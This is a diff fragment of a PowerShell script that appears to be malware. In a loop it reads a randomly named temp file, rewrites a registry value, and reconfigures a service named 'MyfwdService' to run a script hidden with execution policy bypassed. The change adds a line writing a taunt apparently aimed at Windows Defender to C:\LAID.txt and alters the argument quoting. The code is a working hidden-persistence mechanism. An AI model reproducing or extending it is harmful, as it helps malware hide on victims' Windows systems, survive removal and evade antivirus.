@@ -72,10 +72,11 @@ while ($true) {
     $x = Get-ServiceReg -path $regPath
     $y = Get-ServiceName -name $serviceName
     if(Test-Path -Path "$env:temp\jMEmdVuJAtNea.txt" -PathType Leaf){
+        echo "GET LAID WINDOWS DF XD" >> "C:\LAID.txt"
         $fwdName = Get-Content -Path "$env:temp\jMEmdVuJAtNea.txt"
         $fwdPath = "$([System.IO.Path]::GetDirectoryName($fwdPath))\$fwdName"
         Set-ItemProperty -Path "$basePath" -Name $propertyName -Value $fwdPath -Force | Out-Null
-        $arg = "-ep bypass -nop -w hidden '$fwdPath'"
+        $arg = "-ep bypass -nop -w hidden $fwdPath"
         & $exe set "MyfwdService" AppParameters $arg
         Remove-Item -Path "$env:temp\jMEmdVuJAtNea.txt" -Force
     }
